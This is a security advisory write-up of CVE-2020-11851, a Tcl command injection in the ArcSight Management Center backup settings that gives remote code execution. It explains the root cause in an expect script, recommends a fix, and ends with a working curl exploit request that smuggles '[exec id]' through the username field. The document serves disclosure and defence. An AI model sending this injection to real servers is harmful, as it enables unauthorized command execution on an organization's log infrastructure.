# CVE-2020-11851
**Remote Code Execution vulnerability on ArcSight Logger (via ArcSight Management Center)** 

https://nvd.nist.gov/vuln/detail/CVE-2020-11851

### **Executive Summary**
#### `Vulnerability Background`
ArcSight Logger is a comprehensive log management solution that eases compliance burdens and enables faster forensic investigation for security professionals, by unifying and storing machine data logs from across their organizations, and by facilitating rapid search and reporting on that data. 

ArcSight Management Center (ArcMC) is a centralized security management center that manages large deployments of ArcSight solutions such as ArcSight Logger, ArcSight SmartConnectors (Connectors), ArcSight FlexConnectors, and ArcSight Connector Appliance (ConApp) through a single interface.

The vulnerability can be exploited via backup functionality of ArcSight Management Center(version: 2.7.1.2065.0). This backup option works by using “expect” scripts of ArcSight Logger which use Tool Command Language (Tcl). The vulnerability allows attackers to execute arbitrary Tcl commands. This vulnerability on Micro Focus ArcSight Logger product, affecting all version prior to 7.1.1. 

#### `Conclusion`
The server running the vulnerable software can be comprimised by attackers via the RCE vulnerability and become a beachhead from which an adversary could launch further attacks against the organization’s servers, culminating in a serious breach. This vulnerability can result in data loss, corruption, or disclosure to unauthorized parties, loss of accountability or denial of access. 

#### `Recommendations`
It is recommended to check Tcl security best practices for “expect” scripts. Basically, using braces in eval would be safe like below:

```bash
eval puts $exploit   ;# vulnerable  

eval "puts $exploit" ;# vulnerable

eval {puts $exploit} ;# safe
```

More information can be found here: https://wiki.tcl-lang.org/page/Injection+Attack

### **Technical Background**
This section details vectors of command injection that can be used to detect the vulnerability in ArcSight Logger. The titles below can be used to reproduce the attack steps.

#### `Exploring the vulnerable backup option`
In administration tab, there is a backup option. 

![1](https://user-images.githubusercontent.com/51833205/103898363-41c8c200-510e-11eb-97dd-aaa5e2c99e3b.png)

As we can see, we can configure a remote backup server by using SCP protocol. After clicking on the “Save” button, I debugged the server processes by using the tool “pspy” which can be downloaded from here: https://github.com/DominicBreuker/pspy/releases

#### `Debugging the server & Root cause analysis`
After saving the backup configuration, I detected the application uses bash script for checking the SSH server like below (please look at PID 95427):

![2](https://user-images.githubusercontent.com/51833205/103900705-8a35af00-5111-11eb-8f9c-07f2190095fc.png)

Here is the more detailed command(PID 95427) for explanation: 

sh /opt/arcsight/current/arcsight/arcmc/config/logger/`runexpect.sh` /opt/arcsight/current/arcsight/arcmc/bin/filetransfer/lib/ /opt/arcsight/current/arcsight/arcmc/bin/filetransfer/lib/`expect` /opt/arcsight/current/arcsight/arcmc/tmp/`scp.expect.dir.backup1` `UserSuppliedPassword` `UserSuppliedUsernameAndHostname` `UserSuppliedPortNumber` `UserSuppliedBackupDirectory`

Let’s look at the content of “runexpect.sh” and “scp.expect.dir.backup1”(expect script) before explaining the logic of “runexpect.sh”.

Here is the content of “runexpect.sh”:
```bash
#!/bin/sh  
	  
# Set LD_LIBRARY_PATH  
	  
export LD_LIBRARY_PATH=$1  
echo "Assuming LD_LIBRARY_PATH in runexpect :" $LD_LIBRARY_PATH  
shift  
echo "Running command: $*"  
$*  
	  
exit $? 
```

And here is the content of the expect script called “scp.expect.dir.backup1” 

```bash
set password [lindex $argv 0]  
set host [lindex $argv 1]  
set port [lindex $argv 2]  
set dir [lindex $argv 3]  
eval spawn ssh -p $port $host test -d $dir && echo exists  //Vulnerability begins here
expect "*(yes/no)?*$" { send "yes\n" }  
set timeout 600  
expect "*assword:*$" { send "$password\n" } \  
timeout { exit 1 }  
set timeout -1  
expect "\\$ $" 
```
As we can see, “runexpect.sh” sets the environment variable(LD_LIBRARY_PATH) and then executes “expect” binary by using “expect” script called “scp.expect.dir.backup1”. This “expect” script gets 4 arguments to use them in “ssh” command. 

**The actual vulnerability** begins on line 5 of the script named “scp.expect.dir.backup1”. As we mentioned earlier, without braces, user supplied inputs might be very dangerous in Tcl scripts.  

#### `Gaining the code execution`
Since, this code execution vulnerability is completely blind, I used the simplest way to demonstrate the execution. I used, the tool “pspy” to debug the processes and illustrate the arbitrary code execution by sending the malicious HTTP request.

Here is the logic that I wanted “expect” script to execute it:

```bash
eval spawn ssh –p [exec id]  test –d fakehostname && echo exists
[exec : this is argv1
id] : this is argv2
fakehostname : this is argv3
Expected behavior would be like this:
eval spawn ssh –p the_output_of_the_id_command test –d fakehostname && echo exists
# Because, [ ] in Tcl, looks like `` in bash. For more information about the Tcl syntax, please visit to https://wiki.tcl-lang.org/welcome
```

Let’s explain how to achieve to that. If I put space among the “strings” in the “field-username” parameter of the related HTTP request, it would be parsed unintentionally to the “expect” script because of it doesn’t validate argument counts, meaning, I could inject `[exec` as the port number and `id]` as the username. Normally, I couldn’t inject port number parameter of related HTTP request because of the input validation(it should only be digit). 

After sending the HTTP request below, I successfully executed the command and printed its output with tool “pspy”.

![3](https://user-images.githubusercontent.com/51833205/103898354-3d9ca480-510e-11eb-813b-1d4933f8ded7.png)

![4](https://user-images.githubusercontent.com/51833205/103898360-3ffefe80-510e-11eb-8dc8-12a69653f1d0.png)

Here is the corresponding CURL request that I used to exploit the vulnerability(pls modify session related tokens and target):

```bash
curl -i -s -k  -X $'POST' \
    -H $'Host: TARGET' -H $'User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0' -H $'Accept: text/javascript, text/html, application/xml, text/xml, */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'X-Requested-With: XMLHttpRequest' -H $'X-Prototype-Version: 1.5.1.2' -H $'Content-type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Content-Length: 463' -H $'Origin: https://hq-arc-mgmt' -H $'Connection: close' -H $'Referer: https://TARGET/arcmc/stand_alone_backup_config.ftl?menu_id=admin' -H $'Cookie: JSESSIONID=C49A27CF695535133EA896C38A41452A; com.arcsight.product.platform.logger.client.session.SessionContext.productName=\"ArcSight Management Center\"; com.arcsight.product.platform.logger.client.session.SessionContext.arcsightProductName=\"ArcSight Management Center\"; session_string=f2k5OHLthMlDaxUI6HMiah36hzg_sfwlqxEv24LKVAk.; user_id_seq=8' \
    -b $'JSESSIONID=C49A27CF695535133EA896C38A41452A; com.arcsight.product.platform.logger.client.session.SessionContext.productName=\"ArcSight Management Center\"; com.arcsight.product.platform.logger.client.session.SessionContext.arcsightProductName=\"ArcSight Management Center\"; session_string=f2k5OHLthMlDaxUI6HMiah36hzg_sfwlqxEv24LKVAk.; user_id_seq=8' \
    --data-binary $'editid=backup1&update=true&cancelurl=config_home.ftl&previousSubmit=false&asf_token=e151b811-42d6-4220-88cc-c20832597de9&field-protocol=SCP&field-port=22&field-host=originalHostInput&field-username=id]+[exec+fakeuser@fakeHostInput&field-password=fakePasswordInput123&field-filepath=%2Fbackup&schedule-editor-command1=everyday&schedule-editor-args1=&schedule-editor-command2=daily&schedule-editor-args2=12&schedule-editor-every-duration=hours&field-excludedata=All' \
    $'https://TARGET/arcmc/stand_alone_backup_config_edit.ftl?&asf_token=e151b811-42d6-4220-88cc-c20832597de9'
```

